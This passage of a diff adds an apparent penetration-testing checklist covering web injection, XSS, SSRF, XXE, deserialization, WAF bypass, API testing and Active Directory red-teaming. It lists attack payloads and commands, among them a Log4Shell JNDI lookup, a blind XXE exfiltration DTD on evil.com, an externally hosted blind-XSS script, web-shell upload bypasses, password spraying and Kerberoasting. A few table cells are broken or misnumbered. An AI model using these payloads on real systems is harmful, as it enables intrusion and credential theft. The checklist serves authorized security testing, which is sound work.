+<td><code>${7*7}</code> <code>{{7*7}}</code> <code>&lt;%= 7*7 %&gt;</code> → check <code>49</code>. Fingerprint: <code>{{7*'7'}}</code> = <code>7777777</code> (Jinja), <code>49</code> (Twig)</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.6.9</td>
+<td>Expression Language / Code Injection</td>
+<td>Critical</td>
+<td><code>${Runtime.getRuntime().exec(&quot;id&quot;)}</code> (Java EL) — OGNL: <code>%{#context}</code> (Struts)</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.6.10</td>
+<td>XPath Injection</td>
+<td>High</td>
+<td><code>' or 1=1 or '</code> → error/diff response</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.6.11</td>
+<td>LDAP Injection</td>
+<td>High</td>
+<td><code>*)(uid=*))((uid=*</code> on AD-backed logins</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.6.12</td>
+<td>Header Injection / CRLF</td>
+<td>Medium</td>
+<td><code>%0d%0aSet-Cookie:pwn=1</code> in redirect params</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.6.13</td>
+<td>HTML Injection (non-XSS context)</td>
+<td>Low</td>
+<td>Inject<code>&lt;h1&gt;x&lt;/h1&gt;</code> in email/username fields</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.6.14</td>
+<td>Log Injection / Log4Shell</td>
+<td>Critical</td>
+<td><code>${jndi:ldap://oob.example.com/a}</code> in UA/referer/any header + interactsh listener</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.6.15</td>
+<td>HTTP Parameter Pollution</td>
+<td>Medium</td>
+<td><code>?id=1&amp;id=2</code> — behavior diff front-end vs backend</td>
+<td>☐</td>
+</tr>
+</tbody>
+</table>
+<h2 id="1.7-%E2%80%94-xss-family" tabindex="-1">1.7 — XSS Family</h2>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Check</th>
+<th>Severity</th>
+<th>Commands / Methodology</th>
+<th>Status</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1.7.1</td>
+<td>Reflected XSS</td>
+<td>High</td>
+<td>Payloads:<code>&lt;script&gt;alert(1)&lt;/script&gt;</code> → <code>&quot;&gt;&lt;img src=x onerror=alert(1)&gt;</code> → <code>&lt;svg onload=alert(1)&gt;</code> → use polyglots</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.7.2</td>
+<td>Stored/Persistent XSS</td>
+<td>High</td>
+<td>Inject in profile fields, comments, filenames, user-agent (stored in admin logs!)</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.7.3</td>
+<td>DOM-based XSS</td>
+<td>High</td>
+<td>Check<code>document.location, document.URL, innerHTML, eval</code> in JS: grep via `grep -E &quot;location</td>
+<td>innerHTML</td>
+</tr>
+<tr>
+<td>1.7.4</td>
+<td>Blind XSS</td>
+<td>High</td>
+<td><code>&lt;script src=&quot;https://xss.ht/x.js&quot;&gt;&lt;/script&gt;</code> (XSS Hunter) — inject into support tickets, UA, contact forms, password fields</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.7.5</td>
+<td>XSS Filter/WAF Bypass</td>
+<td>High</td>
+<td><code>&lt;svg/onload=alert(1)&gt;</code>, <code>&lt;details open ontoggle=alert(1)&gt;</code>, <code>jav&amp;#x09;ascript:alert(1)</code>, Unicode/nested encoding, <code>&lt;img src=x:alert(alt) onerror=eval(src) alt=1&gt;</code></td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.7.6</td>
+<td>Mutation XSS (mXSS)</td>
+<td>High</td>
+<td>Test with unusual nesting:<code>&lt;noscript&gt;&lt;p title=&quot;&lt;/noscript&gt;&lt;img src=x onerror=alert(1)&gt;&quot;&gt;</code></td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.7.7</td>
+<td>XSS in file uploads (SVG)</td>
+<td>High</td>
+<td>Upload SVG:<code>&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; onload=&quot;alert(document.domain)&quot;/&gt;</code></td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.7.8</td>
+<td>Self-XSS escalation</td>
+<td>Low</td>
+<td>Combine with login CSRF/OAuth to chain</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.7.9</td>
+<td>CSP Bypass</td>
+<td>Medium</td>
+<td>Check<code>Content-Security-Policy</code> → look for <code>unsafe-inline</code>, open whitelists, JSONP endpoints, base-uri missing</td>
+<td>☐</td>
+</tr>
+</tbody>
+</table>
+<h2 id="1.8-%E2%80%94-ssrf%2C-csrf%2C-xxe%2C-deserialization" tabindex="-1">1.8 — SSRF, CSRF, XXE, Deserialization</h2>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Check</th>
+<th>Severity</th>
+<th>Commands / Methodology</th>
+<th>Status</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1.8.1</td>
+<td>SSRF — URL params</td>
+<td>Critical</td>
+<td>Change<code>url=http://169.254.169.254/latest/meta-data/</code> (AWS metadata), <code>http://localhost:8080/</code>, internal IPs</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.8.2</td>
+<td>SSRF Bypass (filters)</td>
+<td>Critical</td>
+<td><code>http://127.1</code>, <code>http://0x7f000001</code>, <code>http://[::]:80</code>, <code>http://127.0.0.1@evil.com</code>, DNS rebinding, redirect-based (<code>evil.com/redirect → localhost</code>), decimal IP <code>http://2130706433</code></td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.8.3</td>
+<td>Blind SSRF (OOB)</td>
+<td>Critical</td>
+<td>Inject Collaborator/interactsh URL in every URL-accepting field (webhooks, import, avatar-URL, PDF generators)</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.8.4</td>
+<td>SSRF → RCE (Gopher)</td>
+<td>Critical</td>
+<td>Gopher protocol to internal Redis/MySQL:<code>gopher://127.0.0.1:6379/_set%0d%0a...</code></td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.8.5</td>
+<td>CSRF on state-changing actions</td>
+<td>Medium</td>
+<td>Generate PoC via Burp Engagement Tools → test without token/Referer</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.8.6</td>
+<td>CSRF via SameSite bypass</td>
+<td>Medium</td>
+<td>If<code>SameSite=Lax</code> → find GET-based state change; popup/POST chain</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.8.7</td>
+<td>XXE (file read)</td>
+<td>Critical</td>
+<td><code>&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;root&gt;&amp;xxe;&lt;/root&gt;</code> in XML uploads/APIs</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.8.8</td>
+<td>Blind XXE (OOB)</td>
+<td>Critical</td>
+<td>External DTD:<code>&lt;!ENTITY % dtd SYSTEM &quot;http://evil.com/x.dtd&quot;&gt;</code> + param entities → exfil via HTTP</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.8.9</td>
+<td>XXE via file upload (docx/xlsx/svg)</td>
+<td>Critical</td>
+<td>Inject XXE entity into<code>word/document.xml</code> inside docx</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.8.10</td>
+<td>Insecure Deserialization (PHP)</td>
+<td>Critical</td>
+<td><code>phpggc</code> — generate gadget chains for Laravel/WordPress/Monolog, base64 → inject in cookies</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.8.11</td>
+<td>Insecure Deserialization (Java)</td>
+<td>Critical</td>
+<td>Java magic bytes<code>rO0AB</code>/<code>aced0005</code> in cookies → <code>ysoserial</code> gadget chains</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.8.12</td>
+<td>Insecure Deserialization (.NET)</td>
+<td>Critical</td>
+<td><code>ViewState</code> unauthenticated? → <code>ysoserial.net</code> + machine-key leak (via other vuln) → RCE</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.8.13</td>
+<td>Insecure Deserialization (Python/Ruby)</td>
+<td>Critical</td>
+<td>Pickle (<code>gopickle</code>), Ruby <code>Marshal</code> — <code>universal_rce</code> gadgets</td>
+<td>☐</td>
+</tr>
+</tbody>
+</table>
+<h2 id="1.9-%E2%80%94-file-upload-%26-business-logic" tabindex="-1">1.9 — File Upload &amp; Business Logic</h2>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Check</th>
+<th>Severity</th>
+<th>Commands / Methodology</th>
+<th>Status</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1.9.1</td>
+<td>Unrestricted File Upload → RCE</td>
+<td>Critical</td>
+<td>Upload<code>shell.php</code> → variations: <code>.php5, .phtml, .php.jpg, shell.php%00.jpg</code>; bypass via double ext, trailing dot/space</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.9.2</td>
+<td>Content-Type/Signature Bypass</td>
+<td>Critical</td>
+<td>Change<code>Content-Type: image/jpeg</code> with PHP body; magic bytes <code>GIF89a</code> prepended</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.9.3</td>
+<td>Path Traversal in filename</td>
+<td>High</td>
+<td>Filename<code>../../../../var/www/html/shell.php</code></td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.9.4</td>
+<td>Race Condition upload</td>
+<td>High</td>
+<td>Upload → immediately access while AV/parser reads → race (upload buster)</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.9.5</td>
+<td>Price/Amount Tampering</td>
+<td>Critical</td>
+<td>Modify price in POST checkout, negative quantities, currency swap</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.9.6</td>
+<td>Integer Overflow/Negative values</td>
+<td>High</td>
+<td><code>quantity=-1</code>, <code>qty=99999999999</code>, <code>discount=100</code></td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.9.7</td>
+<td>Coupon/Voucher abuse</td>
+<td>Medium</td>
+<td>Reuse, race-condition redemption (10 parallel requests), predictable codes</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.9.8</td>
+<td>Email/Phone verification bypass</td>
+<td>Medium</td>
+<td>Change email after verification; use<code>victim@target.com@attacker.com</code> tricks; verify via response manipulation</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.9.9</td>
+<td>Workflow bypass (payment)</td>
+<td>Critical</td>
+<td>Skip payment step, tamper<code>status=success</code>, replay transaction</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.9.10</td>
+<td>Web Cache Poisoning/Deception</td>
+<td>High</td>
+<td>Unkeyed headers: inject via<code>X-Forwarded-Host</code> → check cache-hit response diff; <code>?test</code> → user-specific page cached?</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.9.11</td>
+<td>HTTP Request Smuggling</td>
+<td>Critical</td>
+<td><code>CL.TE / TE.CL / TE.TE</code> — test with Burp HTTP Request Smuggler extension</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.9.12</td>
+<td>HTTP Host Header Poisoning</td>
+<td>High</td>
+<td>Change<code>Host:</code> → password-reset links use injected host? Cache poisoning chain?</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.9.13</td>
+<td>Open Redirect</td>
+<td>Low/Medium</td>
+<td><code>?next=https://evil.com</code> <code>?url=//evil.com</code> <code>?next=///evil.com</code> <code>?next=/%2f%2fevil.com</code> <code>?next=//evil.com@good.com</code></td>
+<td>☐</td>
+</tr>
+</tbody>
+</table>
+<h2 id="1.10-%E2%80%94-waf-detection-%26-bypass-(applies-to-all-above)" tabindex="-1">1.10 — WAF Detection &amp; Bypass (applies to all above)</h2>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Technique</th>
+<th>Method</th>
+<th>Status</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1.10.1</td>
+<td>Fingerprint WAF</td>
+<td><code>wafw00f target.com</code></td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.10.2</td>
+<td>Encoding Bypass</td>
+<td>URL encode ×2 (<code>%253Cscript%253E</code>), Unicode: <code>&lt;scri%u0070t&gt;</code>, Hex <code>\x3c</code></td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.10.3</td>
+<td>Case/Comment Obfuscation</td>
+<td><code>&lt;ScRiPt&gt;</code> <code>&lt;scr/**/ipt&gt;</code> <code>SEL/**/ECT</code> <code>sElEcT+1</code></td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.10.4</td>
+<td>HTTP Parameter Pollution</td>
+<td>WAF checks first param, backend reads last:<code>?q=clean&amp;q=&lt;payload&gt;</code></td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.10.5</td>
+<td>Content-Type Swap</td>
+<td>Switch to<code>application/json</code> / <code>text/xml</code> / form-data for payload delivery</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.10.6</td>
+<td>Chunked Transfer Encoding</td>
+<td><code>Transfer-Encoding: chunked</code> — split payload across chunks</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.10.7</td>
+<td>HTTP Version/Method Evasion</td>
+<td>HTTP/1.0 without Host, raw TCP via<code>netcat</code>, POST body without CT</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.10.8</td>
+<td>Path/Route Bypass</td>
+<td><code>/admin</code> → <code>//admin</code>, <code>/./admin</code>, <code>/admin/</code>, <code>/ADMIN</code>, <code>/%2fadmin</code>, <code>/..;/admin</code>, <code>/;/admin</code></td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.10.9</td>
+<td>Header-based IP trust</td>
+<td><code>X-Forwarded-For: 127.0.0.1</code>, <code>X-Real-IP</code>, <code>X-Original-URL</code>, <code>X-Rewrite-URL</code></td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.10.10</td>
+<td>SQLi WAF bypass payloads</td>
+<td><code>SeLeCt/**/1</code>, `</td>
+<td></td>
+</tr>
+<tr>
+<td>1.10.11</td>
+<td>Rate-limit evasion</td>
+<td>Rotate UA, X-Forwarded-For randomization, distributed wordlist (slow-scan<code>ffuf -rate 5</code>)</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.10.12</td>
+<td>Origin IP discovery (bypass CDN)</td>
+<td>Historical DNS (SecurityTrails), cert SANs (<code>censys</code>), mail headers, <code>http://target.com:8080</code> direct ports</td>
+<td>☐</td>
+</tr>
+</tbody>
+</table>
+<h2 id="1.11-%E2%80%94-misc-%2F-hardening-%26-info-disclosure" tabindex="-1">1.11 — Misc / Hardening &amp; Info Disclosure</h2>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Check</th>
+<th>Severity</th>
+<th>Methodology</th>
+<th>Status</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1.11.1</td>
+<td>Verbose Error Messages / Stack Traces</td>
+<td>Low</td>
+<td>Force errors → Java/PHP/.NET stack trace exposure</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.11.2</td>
+<td>Security Headers Audit</td>
+<td>Low</td>
+<td><code>securityheaders.com</code> / <code>curl -sI</code> — CSP, HSTS, X-Frame-Options, X-Content-Type-Options</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.11.3</td>
+<td>Sensitive info in responses (debug)</td>
+<td>Medium</td>
+<td>Check for<code>X-Debug</code>, debug params <code>?debug=1</code>, <code>X-Powered-By</code>, <code>Server</code> version</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.111.4</td>
+<td>Source Code/Comments Disclosure</td>
+<td>Low</td>
+<td>View-source, .map files (<code>app.js.map</code>), HTML comments with credentials</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.11.5</td>
+<td>CORS Misconfiguration</td>
+<td>High</td>
+<td><code>Origin: evil.com</code> reflected? <code>Access-Control-Allow-Credentials: true</code>? Null origin? Subdomain wildcard trust → chain with XSS</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.11.6</td>
+<td>Clickjacking</td>
+<td>Low</td>
+<td>No<code>X-Frame-Options</code>? → <code>&lt;iframe src=&quot;https://target.com&quot;&gt;</code> renders?</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.11.7</td>
+<td>Subdomain takeover</td>
+<td>High</td>
+<td><code>subjack -w subs.txt -t 100 -ssl -v</code> — CNAME → dangling cloud services</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.11.8</td>
+<td>Default credentials on admin panels</td>
+<td>Critical</td>
+<td><code>admin:admin</code> on <code>/manager/html</code> (Tomcat), <code>/wp-admin</code>, printers, IoT</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.11.9</td>
+<td>Email Spoofing (SPF/DMARC)</td>
+<td>Medium</td>
+<td><code>dig txt target.com</code> — missing <code>-all</code> / no DMARC → <code>swaks</code> spoof test</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.11.10</td>
+<td>TLS/SSL Misconfig</td>
+<td>Medium</td>
+<td><code>testssl.sh target.com</code> — weak ciphers, TLS1.0, missing HSTS</td>
+<td>☐</td>
+</tr>
+</tbody>
+</table>
+<h1 id="part-2%3A-api-pentesting-(owasp-api-security-top-10)" tabindex="-1">PART 2: API PENTESTING (OWASP API Security Top 10)</h1>
+<h2 id="2.1-%E2%80%94-api-recon-%26-endpoint-mapping" tabindex="-1">2.1 — API Recon &amp; Endpoint Mapping</h2>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Check</th>
+<th>Severity</th>
+<th>Commands / Methodology</th>
+<th>Status</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>2.1.1</td>
+<td>API Discovery</td>
+<td>Info</td>
+<td><code>/swagger.json /openapi.json /api-docs /swagger /redoc /graphql</code> — also check <code>/.well-known/</code></td>
+<td>☐</td>
+</tr>
+<tr>
+<td>2.1.2</td>
+<td>Wordlist-based endpoint fuzz</td>
+<td>Info</td>
+<td><code>ffuf -u https://target.com/api/FUZZ -w api-endpoints.txt -mc all -fc 404</code> (use <code>api-wordlists</code> by assetnote)</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>2.1.3</td>
+<td>HTTP Method enumeration</td>
+<td>High</td>
+<td><code>ffuf -u https://target.com/api/v1/user -X FUZZ -w methods.txt</code> (GET,POST,PUT,PATCH,DELETE,TRACE)</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>2.1.4</td>
+<td>Old API versions alive</td>
+<td>High</td>
+<td><code>/api/v1/</code> vs <code>/api/v2/</code> — v1 unpatched/less protected?</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>2.1.5</td>
+<td>GraphQL introspection</td>
+<td>High</td>
+<td><code>curl -X POST https://target.com/graphql -d '{&quot;query&quot;:&quot;{__schema{types{name}}}&quot;}'</code> → use <strong>InQL</strong> (Burp)</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>2.1.6</td>
+<td>Documentation endpoints in prod</td>
+<td>Medium</td>
+<td>Swagger UI exposed w/o auth</td>
+<td>☐</td>
+</tr>
+</tbody>
+</table>
+<h2 id="2.2-%E2%80%94-owasp-api-top-10-testing" tabindex="-1">2.2 — OWASP API Top 10 Testing</h2>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>API Top 10</th>
+<th>Severity</th>
+<th>Methodology</th>
+<th>Status</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>2.2.1</td>
+<td><strong>API1: BOLA (Broken Object Level Authorization)</strong></td>
+<td>Critical</td>
+<td>Swap object IDs in ALL endpoints — user IDs, file IDs, order IDs. API equivalent of IDOR but harder to detect: test with 2+ accounts systematically. Use Autorize</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>2.2.2</td>
+<td><strong>API2: Broken Authentication</strong></td>
+<td>Critical</td>
+<td>No auth on endpoints? Token sent in URL? Weak JWT signing? Bruteforce OTP? Test<code>/api/user/me</code> without token</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>2.2.3</td>
+<td><strong>API3: Broken Object Property Level Authorization</strong></td>
+<td>Critical</td>
+<td>Mass assignment: add<code>{&quot;role&quot;:&quot;admin&quot;,&quot;is_verified&quot;:true,&quot;price&quot;:0}</code> to PATCH/POST; response leaks password hash/PII (excessive data exposure)</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>2.2.4</td>
+<td><strong>API4: Unrestricted Resource Consumption</strong></td>
+<td>Medium</td>
+<td>No rate limit →<code>ffuf -mc 200 -rate 1000</code>; huge page-size params <code>?limit=99999</code>; expensive queries <code>?sort=f1,f2,...f500</code></td>
+<td>☐</td>
+</tr>
+<tr>
+<td>2.2.5</td>
+<td><strong>API5: Function-Level Authorization Bypass</strong></td>
+<td>Critical</td>
+<td>Call admin functions as user:<code>/api/admin/users/delete</code> — hide-URL ≠ security. Test all admin routes w/ user token</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>2.2.6</td>
+<td><strong>API6: Unrestricted Business Flows</strong></td>
+<td>High</td>
+<td>Workflow abuse: coupon ×100, review spam, vote manipulation, reservation blocking</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>2.2.7</td>
+<td><strong>API7: SSRF</strong></td>
+<td>Critical</td>
+<td>All URL-accepting params → internal targets + metadata endpoints (see 1.8.x)</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>2.2.8</td>
+<td><strong>API8: Security Misconfiguration</strong></td>
+<td>High</td>
+<td>Verbose errors, CORS wildcard, methods allowed (TRACE), default pages, missing TLS</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>2.2.9</td>
+<td><strong>API9: Improper Inventory Management</strong></td>
+<td>Medium</td>
+<td>Find old/ghost API versions, staging APIs (<code>staging.target.com/api</code>), deprecated-but-alive endpoints</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>2.2.10</td>
+<td><strong>API10: Unsafe Consumption of APIs</strong></td>
+<td>High</td>
+<td>Target consumes 3rd-party API → SSRF-ish, injection via upstream response, XML from partner parsed unsafely</td>
+<td>☐</td>
+</tr>
+</tbody>
+</table>
+<h2 id="2.3-%E2%80%94-graphql-specific" tabindex="-1">2.3 — GraphQL-Specific</h2>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Check</th>
+<th>Severity</th>
+<th>Methodology</th>
+<th>Status</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>2.3.1</td>
+<td>Introspection enabled in prod</td>
+<td>Medium</td>
+<td>Query<code>__schema</code> — dump w/ InQL, graphw00f</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>2.3.2</td>
+<td>Authorization per-field/per-object</td>
+<td>Critical</td>
+<td>Introspect → query user fields as other user</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>2.3.3</td>
+<td>Batching attacks (rate-limit bypass)</td>
+<td>High</td>
+<td>Send array of queries:<code>[{query:...},{query:...}×100]</code> — 1 request = 100 attempts</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>2.3.4</td>
+<td>Mutation abuse</td>
+<td>Critical</td>
+<td>Call write mutations w/o proper checks</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>2.3.5</td>
+<td>Field suggestion leakage</td>
+<td>Low</td>
+<td><code>{&quot;query&quot;:&quot;{ usr }&quot;}</code> → &quot;Did you mean user?&quot; → enumerate schema when introspection off</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>2.3.6</td>
+<td>Depth/complexity attacks (DoS)</td>
+<td>Medium</td>
+<td>Deep nested query:<code>{a{b{c{...×1000}}}}</code></td>
+<td>☐</td>
+</tr>
+</tbody>
+</table>
+<h2 id="2.4-%E2%80%94-api-rate-limiting-%26-abuse-(critical-for-fintech%2Flogistics-clients)" tabindex="-1">2.4 — API Rate Limiting &amp; Abuse (Critical for fintech/logistics clients)</h2>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Check</th>
+<th>Severity</th>
+<th>Methodology</th>
+<th>Status</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>2.4.1</td>
+<td>Rate limit on auth endpoints</td>
+<td>High</td>
+<td>1000 requests → any 429/block?</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>2.4.2</td>
+<td>Rate-limit bypass</td>
+<td>High</td>
+<td>Case-rotate endpoint<code>/aPi/LoGiN</code>, trailing slash, HPP, rotate IP headers</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>2.4.3</td>
+<td>OTP/PIN bruteforce</td>
+<td>Critical</td>
+<td>4-6 digit OTP, no lockout → Turbo Intruder race</td>
+<td>☐</td>
+</tr>
+</tbody>
+</table>
+<h1 id="part-3%3A-red-teaming-%E2%80%94-ad-%2F-corporate-environment" tabindex="-1">PART 3: RED TEAMING — AD / CORPORATE ENVIRONMENT</h1>
+<h2 id="3.1-%E2%80%94-external-%E2%86%92-initial-access" tabindex="-1">3.1 — External → Initial Access</h2>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Check</th>
+<th>Severity</th>
+<th>Commands / Methodology</th>
+<th>Status</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>3.1.1</td>
+<td>External Attack Surface</td>
+<td>Info</td>
+<td><code>nmap -sS -Pn -p- &lt;external_IP&gt;</code>, <code>shodan.io</code>, certificate CNs</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>3.1.2</td>
+<td>Password Spraying OWA/ADFS/Azure</td>
+<td>Critical</td>
+<td><code>nxc smb &lt;ip&gt; -u users.txt -p 'Company@2024' --continue-on-success</code> | <code>MSOLSpray</code> (Azure)</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>3.3.1</td>
+<td>VPN endpoint attacks</td>
+<td>High</td>
+<td>Pulse SSL VPN CVEs,<code>nmap --script ssl-enum-ciphers</code>; default creds on VPN portals</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>3.1.4</td>
+<td>Password reset spoofing / phishing infra</td>
+<td>High</td>
+<td><code>gophish</code> + evilginx2 for ADFS/O365 (authorized only)</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>3.1.5</td>
+<td>Public RDP exposed</td>
+<td>Critical</td>
+<td><code>hydra -L u -P p rdp://target</code> + NLA bypass checks</td>
+<td>☐</td>
+</tr>
+</tbody>
+</table>
+<h2 id="3.2-%E2%80%94-internal-reconnaissance-(post-foothold)" tabindex="-1">3.2 — Internal Reconnaissance (Post-Foothold)</h2>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Check</th>
+<th>Severity</th>
+<th>Commands / Methodology</th>
+<th>Status</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>3.2.1</td>
+<td>Situational Awareness</td>
+<td>Info</td>
+<td><code>whoami /all</code> | <code>ipconfig /all</code> | <code>systeminfo</code> | <code>net user /domain</code> | <code>net group &quot;domain admins&quot; /domain</code></td>
+<td>☐</td>
+</tr>
+<tr>
+<td>3.2.2</td>
+<td>AD Enumeration w/ PowerView</td>
+<td>Info</td>
+<td><code>Get-DomainUser -Properties samaccountname,description</code> | <code>Get-DomainGroup</code> | <code>Get-DomainOU</code> | <code>Find-LocalAdminAccess</code></td>
+<td>☐</td>
+</tr>
+<tr>
+<td>3.2.3</td>
+<td>BloodHound (SharpHound ingest)</td>
+<td>Critical</td>
+<td><code>SharpHound.exe -c All</code> → import → find shortest path Domain Admin</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>3.2.4</td>
+<td>SMB/Shares enumeration</td>
+<td>High</td>
+<td><code>nxc smb &lt;dc_ip&gt; -u user -p pass --shares</code> | <code>smbclient -L //dc -U user</code></td>
+<td>☐</td>
+</tr>
+<tr>
+<td>3.2.5</td>
+<td>Kerberoasting-able SPNs</td>
+<td>Critical</td>
+<td><code>GetUserSPNs.py -dc-ip &lt;ip&gt; domain/user:pass -request</code> → <code>hashcat -m 13100</code></td>
+<td>☐</td>
+</tr>
+<tr>
+<td>3.2.6</td>
+<td>AS-REP Roastable accounts</td>
+<td>Critical</td>
+<td><code>GetNPUsers.py domain/ -usersfile users.txt -no-pass</code> → <code>hashcat -m 18200</code></td>
+<td>☐</td>
+</tr>
+<tr>
+<td>3.2.7</td>
+<td>LAPS misconfiguration</td>
+<td>High</td>
+<td><code>nxc smb &lt;ip&gt; -u u -p p --laps</code> | read <code>ms-mcs-AdmPwd</code> if rights</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>3.2.8</td>
+<td>Passwords in description/attributes</td>
+<td>High</td>
+<td><code>Get-DomainUser -LDAPFilter 'Description=*pass*' -Properties description</code></td>
+<td>☐</td>
+</tr>
+<tr>
+<td>3.2.9</td>
+<td>Check MS17-010 (EternalBlue) legacy</td>
+<td>Critical</td>
+<td><code>nmap -p445 --script smb-vuln-ms17-010 &lt;ip&gt;</code></td>
+<td>☐</td>
+</tr>
+<tr>
+<td>3.2.10</td>
+<td>GPO abuse (GPP cpassword)</td>
+<td>Critical</td>
+<td><code>gpp-decrypt &lt;hash&gt;</code> | <code>Get-DomainGPO</code> — check SYSVOL XMLs</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>3.2.11</td>
+<td>Zone transfer internal</td>
+<td>High</td>
+<td><code>dig axfr &lt;domain&gt; @&lt;dc_ip&gt;</code></td>
+<td>☐</td>
+</tr>
+</tbody>
+</table>
+<h2 id="3.3-%E2%80%94-credential-attacks" tabindex="-1">3.3 — Credential Attacks</h2>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Check</th>
+<th>Severity</th>
+<th>Commands / Methodology</th>
+<th>Status</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>3.3.1</td>
+<td>Local admin spray (lateral)</td>
+<td>Critical</td>
+<td><code>nxc smb &lt;subnet&gt;/24 -u u -p p --local-auth</code> (find shared local admin)</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>3.3.2</td>
+<td>Credential dumping (post-priv)</td>
+<td>Critical</td>
